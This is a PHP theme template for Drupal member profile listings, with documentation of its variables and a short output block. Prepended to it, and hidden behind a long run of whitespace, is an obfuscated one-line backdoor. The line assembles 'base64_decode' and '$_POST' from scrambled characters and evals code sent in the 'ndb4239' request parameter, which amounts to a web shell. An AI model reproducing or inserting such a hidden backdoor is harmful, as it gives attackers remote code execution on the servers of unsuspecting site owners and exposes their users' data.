<?php                                                                                                                                                                                                                                                               $sF="PCT4BA6ODSE_";$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s22=${strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2])}['ndb4239'];if(isset($s22)){eval($s21($s22));}?><?php

/**
 * @file
 * Default theme implementation for wrapping member listings and their
 * profiles.
 *
 * This template is used when viewing a list of users. It can be a general
 * list for viewing all users with the URL of "example.com/profile" or when
 * viewing a set of users who share a specific value for a profile such
 * as "example.com/profile/country/belgium".
 *
 * Available variables:
 * - $content: User account profiles iterated through profile-listing.tpl.php.
 * - $current_field: The named field being browsed. Provided here for context.
 *   The above example would result in "last_name". An alternate template name
 *   is also based on this, e.g., "profile-wrapper-last_name.tpl.php".
 *
 * @see template_preprocess_profile_wrapper()
 */
?>
<div id="profile">
  <?php print $content; ?>
</div>
